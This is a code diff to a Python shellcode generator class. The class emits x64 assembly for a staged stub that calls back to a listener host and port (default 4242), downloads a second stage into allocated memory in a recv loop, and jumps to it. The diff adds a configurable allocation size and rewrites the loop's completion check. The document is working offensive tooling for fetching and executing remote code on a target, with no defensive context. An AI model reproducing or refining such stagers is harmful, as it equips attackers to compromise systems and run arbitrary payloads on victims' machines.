@@ -57,6 +57,11 @@ class Shellcode():
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
 
+    advanced = {}
+    advanced["ALLOCSIZE"] = {}
+    advanced["ALLOCSIZE"]["optional"] = "yes"
+    advanced["ALLOCSIZE"]["description"] = "Allocation size for second stage"
+
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
@@ -93,13 +98,15 @@ class Shellcode():
     def set_args(self):
         """Configure the arguments that may be used by the shellcode stub
         """
-
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
+   
+        all_args = Shellcode.arguments
+        all_args.update(Shellcode.advanced)
+        argv_dict = modparser.argument_check(all_args, self.arg_list)
         if (argv_dict == None):
             exit(-1)
 
         # Configure the options used by the host to obtain the callback
-        if ("LPORT" not in argv_dict.keys()):
+        if "LPORT" not in argv_dict.keys():
             self.lport = 4242
         else:
             self.lport = int(argv_dict["LPORT"])
@@ -107,7 +114,11 @@ class Shellcode():
         self.lhost = argv_dict['LHOST']
 
         # Set the initial allocation size and how much to recv per call
-        self.alloc_size = 0x3000
+        if "ALLOCSIZE" not in argv_dict.keys():
+            self.alloc_size = 0x3000
+        else:
+            self.alloc_size = int(argv_dict["ALLOCSIZE"], 16)
+
         self.recv_size = 0x1000
 
         return 0
@@ -172,12 +183,8 @@ call_recv:
     call rax
 
 check_complete:
-    cmp rax, {self.recv_size}
-    je inc_ptr
-    cmp rax, {self.recv_size}
-    jl download_complete
-;    test eax, eax
-;    jle download_complete
+    test eax, eax
+    jle download_complete
 
 inc_ptr:
     mov r8, [rbp - {self.storage_offsets['pResponse']}]
@@ -186,8 +193,7 @@ inc_ptr:
     jmp call_recv
 
 download_complete:
-    jmp [rbp - {self.storage_offsets['lpvShellcode']}]
-        """
+    jmp [rbp - {self.storage_offsets['lpvShellcode']}]\n"""
 
         return src
 
